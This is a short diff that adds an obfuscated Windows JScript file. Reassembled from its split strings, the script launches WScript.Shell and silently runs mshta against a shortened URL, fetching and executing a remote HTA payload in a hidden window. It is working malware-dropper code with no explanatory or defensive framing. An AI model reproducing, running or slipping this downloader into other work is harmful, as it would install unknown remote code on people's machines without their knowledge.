@@ -1,0 +1,5 @@
+stzuuqwn = ("cript.Sh")
+var fslzwgbk = WScript.CreateObject("WS"+stzuuqwn+"ell")
+zxguyccp = ("msh")
+uirkuhbp = ("ta ")
+fslzwgbk.Run((zxguyccp+uirkuhbp)+" https://t.ly/6KrZ",0)
